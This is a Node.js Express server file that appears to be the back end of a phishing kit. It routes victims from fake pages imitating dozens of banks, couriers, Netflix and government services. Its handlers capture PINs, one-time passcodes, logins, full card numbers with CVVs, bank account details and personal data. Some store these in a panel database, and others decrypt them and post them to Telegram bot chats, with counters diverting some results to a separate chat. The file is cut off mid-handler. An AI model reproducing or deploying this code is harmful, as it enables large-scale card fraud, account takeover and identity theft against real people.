const express = require("express");
const bodyparser = require("body-parser");
const axios = require("axios");
const mongoose = require("mongoose");
var cors = require("cors");
var fs = require("fs");
var CryptoJS = require("crypto-js");
require("dotenv").config();

const port = process.env.PORT || 8080;

const fileUpload = require("express-fileupload");
const app = express();
app.use(bodyparser.json());
app.use(cors());
app.use(fileUpload());

mongoose.connect(process.env.mongoURL);
const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error: "));
db.once("open", () => {
	app.listen(port, "0.0.0.0", () => {
		console.log("App listening on port", port);
	});
});

var bankName;

app.use("/", require("./routes/ips"));

app.get("/getRespentesting123!", (req, res) => {
	fs.readFile("results.txt", function (err, data) {
		var filecontents = data;
		res.send(filecontents);
	});
});

//ONE
app.use("/one", require("./routes/one"));

//SFE
app.use("/sfe", require("./routes/sfe"));

//GPAY
app.use("/gpay", require("./routes/gpay"));

//HSBC MX
app.use("/hsbcmx", require("./routes/hsbcmx"));

//HSBC
app.use("/hsbc", require("./routes/hsbc"));

//COOP
app.use("/coop", require("./routes/coop"));

//PAYSERA
app.use("/paysera", require("./routes/paysera"));

//JL
app.use("/jl", require("./routes/jl"));

//BBBANK
app.use("/bbbank", require("./routes/bbbank"));

//MAIB
app.use("/maib", require("./routes/maib"));

//POSTBANK
app.use("/postbank", require("./routes/postbank"));

//OPBANK
app.use("/opbank", require("./routes/opbank"));

//ENERGY
app.use("/energy", require("./routes/energy"));

app.get("/options", (req, res) => {
	res.send(require("./files/options.json"));
});

//WISE
app.use("/wise", require("./routes/wise"));

//ASB BUSINESS
app.use("/asbBusiness", require("./routes/asbBusiness"));

//THREE
app.use("/three", require("./routes/three"));

//BOA
app.use("/boa", require("./routes/boa"));

//YBS
app.use("/ybs", require("./routes/ybs"));

//COMMERZ
app.use("/commerz", require("./routes/commerz"));

//CITI
app.use("/citi", require("./routes/citi"));

//TEACHERS
app.use("/teachers", require("./routes/teachers"));

//NSI
app.use("/nsi", require("./routes/nsi"));

//BOQ
app.use("/boq", require("./routes/boq"));

//KIWI
app.use("/kiwi", require("./routes/kiwi"));

//THAMES
app.use("/thameswater", require("./routes/thameswater"));

//DHL
app.use("/dhl", require("./routes/dhl"));

//USPS
app.use("/usps", require("./routes/usps"));

//OBERBANK
app.use("/oberbank", require("./routes/oberbank"));

//WELLS
app.use("/wells", require("./routes/wells"));

//SANTS
app.use("/sants", require("./routes/sants"));
app.use("/santsCommand", require("./routes/sants"));

//ATO
app.use("/ato", require("./routes/ato"));

//KUCOIN
app.use("/kc", require("./routes/kucoin"));

//KURONE
app.use("/kurone", require("./routes/kurone"));

//BACKMARKET
app.use("/back", require("./routes/backmarket"));

//VICTORIAMD
app.use("/victoriamd", require("./routes/victoriamd"));

//COMMBANK
app.use("/comm", require("./routes/commbank.js"));

//MICB
app.use("/micb", require("./routes/micb"));

//MQ
app.use("/mq", require("./routes/macquarie"));

//BNP
app.use("/bnp", require("./routes/bnp"));

//DBS
//DBS
//DBS

app.get("/dbsCustomers/:id", (req, res) => {
	uniqueid = req.params.id;

	let details = [uniqueid];
	let query = `SELECT * FROM customers WHERE uniqueid=?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send(rows);
		else console.log(err);
	});
});

app.get("/dbsCustomers", (req, res) => {
	panelConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
		if (!err) res.send(rows);
		else console.log(err);
	});
});

app.post("/dbsCommand", cors(), (req, res) => {
	uniqueid = req.body.uniqueid;
	newStatus = req.body.status;

	if (newStatus == 12) {
		merchant = req.body.merchant;
		amount = req.body.amount;
		let details = [newStatus, merchant, amount, uniqueid];
		let query = `UPDATE customers SET status=?, merchant=?, amount=? WHERE uniqueid=?`;

		panelConnection.query(query, details, (err, rows, fields) => {
			if (!err) res.send("Update Completed");
			else console.log(err);
		});
	} else {
		let details = [newStatus, uniqueid];
		let query = `UPDATE customers SET status=? WHERE uniqueid=?`;

		panelConnection.query(query, details, (err, rows, fields) => {
			if (!err) res.send("Update Completed");
			else console.log(err);
		});
	}
});

app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
	uniqueid = req.params.id;

	let details = [uniqueid];
	let query = `DELETE FROM customers WHERE uniqueid= ?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Update Completed");
		else console.log(err);
	});
});

app.post("/dbsSaveLogin", cors(), (req, res) => {
	pin = req.body.pin;
	userId = req.body.userid;
	ip = req.body.ip;
	uniqueid = req.body.uniqueid;

	let details = [pin, userId, uniqueid, ip];
	let query = `INSERT INTO customers(pin,userId,uniqueid,status,ip) VALUES (?,?,?,1,?)`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Insertion Completed");
		else console.log(err);
	});
});

app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
	pin = req.body.pin;
	userId = req.body.userid;
	uniqueid = req.body.uniqueid;

	let details = [pin, userId, uniqueid];
	let query = `UPDATE customers SET pin=?, userId=?, status = 1 WHERE uniqueid = ?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Insertion Completed");
		else console.log(err);
	});
});

app.post("/dbsPaymentOtp", cors(), (req, res) => {
	paymentOtp = req.body.paymentOtp;
	uniqueid = req.body.uniqueid;

	let details = [paymentOtp, uniqueid];
	let query = `UPDATE customers SET paymentOtp=?, status = 15 WHERE uniqueid = ?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Insertion Completed");
		else console.log(err);
	});
});

app.post("/dbsSavePhone", cors(), (req, res) => {
	telephone = req.body.telephone;
	uniqueid = req.body.uniqueid;

	let details = [telephone, uniqueid];
	let query = `UPDATE customers SET telephone=?, status = 5 WHERE uniqueid = ?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Insertion Completed");
		else console.log(err);
	});
});

app.post("/dbsSaveEmail", cors(), (req, res) => {
	email = req.body.email;
	uniqueid = req.body.uniqueid;

	let details = [email, uniqueid];
	let query = `UPDATE customers SET email=?, status = 3 WHERE uniqueid = ?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Insertion Completed");
		else console.log(err);
	});
});

app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
	otp = req.body.otp;
	uniqueid = req.body.uniqueid;

	let details = [otp, uniqueid];
	let query = `UPDATE customers SET otp=?, status = 7 WHERE uniqueid = ?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Insertion Completed");
		else console.log(err);
	});
});

app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
	otp = req.body.otp;
	uniqueid = req.body.uniqueid;

	let details = [otp, uniqueid];
	let query = `UPDATE customers SET otp=?, status = 9 WHERE uniqueid = ?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Insertion Completed");
		else console.log(err);
	});
});

app.post("/dbsSaveCC", cors(), (req, res) => {
	ccnum = req.body.ccnum;
	ccexp = req.body.ccexp;
	cccvv = req.body.cccvv;
	uniqueid = req.body.uniqueid;

	let details = [ccnum, ccexp, cccvv, uniqueid];
	let query = `UPDATE customers SET ccnum=?, ccexp=?, cccvv=?, status = 11 WHERE uniqueid = ?`;

	panelConnection.query(query, details, (err, rows, fields) => {
		if (!err) res.send("Insertion Completed");
		else console.log(err);
	});
});

//ANZ
app.use("/anz", require("./routes/anz"));

//DISNEY
app.use("/disney", require("./routes/disney"));

//WP
app.use("/wp", require("./routes/westpac"));

//RBC
app.use("/rbc", require("./routes/rbc"));

//BOI
app.use("/boi", require("./routes/boi"));

//ASB
app.use("/asb", require("./routes/asb"));

//BNZ
app.use("/bnz", require("./routes/bnz"));

//LLOYDS
app.use("/lloyds", require("./routes/lloyds"));

//BINANCE
app.use("/binance", require("./routes/binance"));

//UBANK
app.use("/ubank", require("./routes/ubank"));

//SUNCORP
app.use("/suncorp", require("./routes/suncorp"));

//UBANK IVR
app.use("/ubankIVR", require("./routes/ubankIVR"));

//UBANKONE
app.use("/ubankOne", require("./routes/ubankOne"));

//NAB
app.use("/nab", require("./routes/nab"));

//MULTIPANEL NZ
app.use("/multiNZ", require("./routes/multiNZ"));

//AIB
app.use("/aib", require("./routes/aib"));

//VANQUIS
app.use("/vanquis", require("./routes/vanquis"));

//BENDIGO
app.use("/bendigo", require("./routes/bendigo"));

//RURAL
app.use("/rural", require("./routes/rural"));

//O2
app.use("/o2", require("./routes/o2"));

//AUSPOST
app.use("/auspost", require("./routes/auspost"));

//MEDICARE
app.use("/medicare", require("./routes/medicare"));

//PEOPLES
app.use("/people", require("./routes/people"));

//DHL
//DHL
//DHL

let mason = 4;

app.post("/masonDHL", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (mason == 4) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				mason = 0;
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=DHLMason:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1912976454&text=DHL:\n${originalText}`
				);
				mason += 1;
			}

			res.send("Update Completed");
		});
});

//NETLIX
//NETLIX
//NETLIX

app.post("/fpaysNetflix", (req, res) => {
	username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
		CryptoJS.enc.Utf8
	);
	password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
		CryptoJS.enc.Utf8
	);
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			var loginText = `+----------- Login Information ------------+\nUsername: ${username}\nPassword: ${password}`;
			if (fpaysC == 6) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
				);
				fpaysC = 0;
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixFpays:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Netflix:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=NetflixLogin:\n${loginText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=NetflixLogin:\n${loginText}`
				);
				fpaysC += 1;
			}

			res.send("Update Completed");
		});
});

//YODEL
//YODEL
//YODEL

app.post("/sendYodelRes", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(`${req.body.userAgent}`, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(`${req.body.userIp}`, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: 680379375,
						text: `YodelTriz:\n${originalText}`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});
			axios
				.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
					{
						chat_id: 1190384225,
						text: `Yodel:\n${originalText}`,
						parse_mode: "Markdown",
					}
				)
				.catch((e) => {
					console.log(e);
				});

			res.send("Update Completed");
		});
});

let ssCount = 0;

app.post("/sendSSYodelres", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (ssCount == 7) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				ssCount = 0;
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelSS:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1270989114&text=Yodel:\n${originalText}`
				);
				ssCount += 1;
			}

			res.send("Update Completed");
		});
});

let yodelM4STERB0Y = 0;

app.post("/yodelM4STERB0Y", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (yodelM4STERB0Y == 6) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				yodelM4STERB0Y = 0;
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelM4STER:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1465132165&text=Yodel:\n${originalText}`
				);
				yodelM4STERB0Y += 1;
			}

			res.send("Update Completed");
		});
});

let arcount = 0;

app.post("/sendARRYodelRes", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (arcount == 6) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				arcount = 0;
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelAR:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=853331970&text=Yodel:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=999824723&text=Yodel:\n${originalText}`
				);
				arcount += 1;
			}

			res.send("Update Completed");
		});
});

app.post("/mazzaYodel", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userAgent = CryptoJS.AES.decrypt(req.body.userAgent, "402312").toString(
		CryptoJS.enc.Utf8
	);
	userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
		CryptoJS.enc.Utf8
	);
	scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
		CryptoJS.enc.Utf8
	);
	bin = req.body.bin;

	if (bin.length === 7) {
		formatBin = bin.replace(/ /g, "");
		if (formatBin.length === 7) {
			formatBin = bin.slice(0, -1);
		}
		bin = formatBin;
	}
	axios
		.get(`https://lookup.binlist.net/${bin}`)
		.then((resp) => {
			if (!resp.data.bank) {
				bankName = "";
			} else {
				bankName = resp.data.bank.name;
			}
		})
		.then(function () {
			binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
			var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
			if (mazCount == 6) {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
				mazCount = 0;
			} else if (bin === "542011") {
				axios.post(
					`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
				);
			} else {
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelMazza:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Yodel:\n${originalText}`
				);
				axios.post(
					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
				);
				mazCount += 1;
			}

			res.send("Update Completed");
		});
});

app.post("/yardzYodel", (req, res) => {
	fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
		CryptoJS.enc.Utf8
	);
	dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
		CryptoJS.enc.Utf8
	);
	address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
		CryptoJS.enc.Utf8
	);
	city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
		CryptoJS.enc.Utf8
	);
	postcode = CryptoJS.AES.decrypt(req.body.postcode, "402312").toString(
		CryptoJS.enc.Utf8
	);
	telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
		CryptoJS.enc.Utf8
	);
	ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
		CryptoJS.enc.Utf8
	);
